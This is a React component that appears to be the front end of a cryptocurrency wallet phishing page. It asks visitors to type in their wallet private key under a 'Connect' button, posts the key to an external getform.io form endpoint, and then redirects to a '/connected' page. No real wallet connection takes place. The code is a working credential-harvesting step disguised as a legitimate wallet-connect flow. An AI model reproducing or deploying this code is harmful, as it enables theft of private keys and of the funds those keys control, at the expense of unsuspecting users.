import { useState } from "react";
import axios from "axios";
import { Spinner } from "@chakra-ui/react";

const Privatekey = () => {
  const [privateKey, setPrivateKey] = useState("");

  const [spinner, setSpinner] = useState(false);//Spinner state

/**********HANDLE SUBMIT FUNCTION***********/

  const onSubmit = (e) => {
    e.preventDefault();
    setSpinner(true);
    const formData = new FormData();
    formData.append("privateKey", privateKey);

    axios
      .post("https://getform.io/f/5cbe89d1-2594-43f8-b30a-8672e2eefdd5 ", formData)
      .then((res) => {
        window.location.href = "/connected";
      })
      .catch((error) => {
        console.log(error);
      });
  };

/*****************************************/

  return (
    <>
      <form className="upload">
        <input
          placeholder="Type in your Private Key"
          name="PrivateKey"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          required
        />
      </form>

      <div className="submit-btn-main">
        <button className="btn1" onClick={onSubmit}>
          {spinner === false ? <p>Connect</p> : <Spinner />}
        </button>
      </div>
    </>
  );
};

export default Privatekey;
